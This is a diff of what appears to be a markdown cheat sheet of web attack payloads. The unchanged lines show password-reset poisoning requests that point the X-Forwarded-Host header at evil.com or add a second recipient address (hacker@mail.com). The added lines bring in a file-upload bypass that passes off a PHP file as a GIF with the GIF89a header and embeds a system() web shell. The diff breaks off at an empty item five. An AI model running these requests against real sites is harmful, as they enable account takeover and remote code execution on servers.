@@ -373,12 +373,12 @@ email=victim@mail.com&email=hacker@mail.com
 POST /reset HTTP/1.1
 Host: target.com
 X-Forwarded-Host: evil.com
-...
+
 
 email=victim@mail.com
-...
-Using separator in value of the parameter
 
+Using separator in value of the parameter
+``` 
 3. Using separator in value of the parameter
 ```bash
 POST /reset HTTP/1.1
@@ -386,4 +386,21 @@ Host: target.com
 ...
 
 email=victim@mail.com,hacker@mail.com
+```
+4. File Upload
+
+- Upload the payload, but start with GIF89a; 
+```bash
+POST /images/upload/ HTTP/1.1
+Host: target.com
 ...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/gif
+
+GIF89a; <?php system("id") ?>
+...
+
+```
+5. 
